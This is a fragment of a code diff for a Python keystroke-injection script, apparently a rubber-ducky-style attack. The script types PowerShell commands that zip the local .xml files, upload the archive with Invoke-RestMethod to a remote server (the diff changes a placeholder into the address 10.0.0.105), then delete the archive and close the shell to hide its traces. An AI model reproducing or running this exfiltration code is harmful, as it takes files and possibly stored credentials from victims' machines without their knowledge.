@@ -25,22 +25,22 @@ time.sleep(0.5)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 
-
+time.sleep(0.5)
 keyboard.type('Compress-Archive -U -Path .\*.xml -DestinationPath temp.zip')
 
 time.sleep(0.5)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 
-time.sleep(2)
-keyboard.type(' Invoke-Restmethod -Uri http://yourwebserver/temp.zip -Method Put -Infile .\temp.zip')
+time.sleep(1)
+keyboard.type(' Invoke-Restmethod -Uri http://10.0.0.105/temp.zip -Method Put -Infile temp.zip')
 
 time.sleep(0.5)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 
 time.sleep(0.5)
-keyboard.type('rm .\temp.zip')
+keyboard.type('rm temp.zip')
 
 time.sleep(0.5)
 keyboard.press(Key.enter)
@@ -59,11 +59,3 @@ keyboard.type('exit')
 time.sleep(0.5)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
-
-
-
-  
-        
-        
-
-
